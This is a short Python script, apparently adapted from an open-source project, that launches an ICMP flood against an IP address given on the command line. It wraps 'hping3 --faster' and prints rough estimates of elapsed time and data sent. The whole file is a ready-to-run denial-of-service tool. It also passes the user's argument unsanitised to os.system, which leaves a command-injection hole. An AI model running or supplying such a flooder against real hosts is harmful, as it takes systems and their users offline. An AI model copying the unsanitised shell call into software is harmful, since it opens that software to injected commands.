#!/usr/bin/env python3

# Code taken and modified from https://github.com/GAR-Project/project/blob/master/src/ddos.py

import os, sys, time, datetime

# strings
NAME = '[FLOOD] '
ERROR_BAD_ARGV_FROM_USER = NAME + 'Error, incorrect arguments: '
INFO_INIT_1 = NAME + 'Starting the attack on the given IP '
INFO_STATS = NAME + 'Quitting, showing stats:'
ATTACK_FIN = NAME + 'Attack complete.'

# consts
PKTS_CADENCE = 100
PKTS_LEN = 1442
DATA_LEN = 1000000
DATA_STR = 'MB'
INIT_WAIT = 4	# wait for this many seconds

initial_time = datetime.datetime.now()

def get_str_time():
	'''
	Returns the current time.
	'''
	return ('[' + (datetime.datetime.now()).strftime('%H:%M:%S') + ']')


def diff():
	'''
	Get the elapsed time between initial_time global const and present.

	Params:
	    none

	Returns:
	    (datetime): a datetime object representing the duration elapsed
	'''
	return datetime.datetime.now() - initial_time


def stats():
	'''
	Returns statistics string in this format:
	[+] Time Elapsed: 0:12:34.56789
	[+] Data sent: 1.23456 MB
	'''
	return ('[+] Time Elapsed: ' + str(diff()) + '\n' + '[+] Data sent: '
		+ str(diff().total_seconds() * PKTS_CADENCE * PKTS_LEN / DATA_LEN) + ' ' + DATA_STR + '\n')

if __name__ == "__main__":
	# Check the passed arguments
	if len(sys.argv) != 2:
		print(get_str_time() + ERROR_BAD_ARGV_FROM_USER + '\n\n\t Usage: python3 ' + sys.argv[0] + ' <Destination IP>')
		exit(-1)


	# Tell the user how he/she can stop the attack
	print(INFO_INIT_1 + sys.argv[1])
	os.system('sleep ' + str(INIT_WAIT))

	# Run hping3!
	os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])

	# Show the stats
	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
	print(get_str_time() + ATTACK_FIN)
